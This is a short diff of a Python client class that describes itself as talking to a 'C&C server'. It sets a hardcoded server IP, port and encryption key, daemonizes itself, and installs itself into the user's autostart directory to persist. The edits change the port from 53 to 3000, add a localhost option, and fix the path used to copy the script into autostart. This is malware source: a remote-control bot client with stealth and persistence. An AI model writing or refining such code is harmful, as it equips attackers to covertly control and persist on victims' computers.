@@ -15,9 +15,10 @@ class client:
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
     host = '18.205.103.236'
+    # host = 'localhost'
 
     # port of the server to connect to, can be changed depending on what port server is listening at
-    port = 53
+    port = 3000
 
     BUFFER_SIZE = 20480
 
@@ -27,6 +28,7 @@ class client:
     key ='YbBugTC9pGKLMdak53p6lmy7OVp3E5qegMkMq4iPxU4='
 
     def __init__(self):
+
         # deamonize the process
         self.daemonize()
 
@@ -115,7 +117,7 @@ class client:
         auto_config_dir = os.path.join(os.getenv("HOME"), ".config", "autostart")
         auto_config_file = os.path.join(auto_config_dir, "client.py")
         auto_config_desktop = os.path.join(auto_config_dir, "client.desktop")
-        script_path = os.path.join(os.getcwd(), __file__)
+        script_path = os.path.realpath(__file__)
         try:
             if not os.path.exists(auto_config_dir):
                 os.mkdir(auto_config_dir)
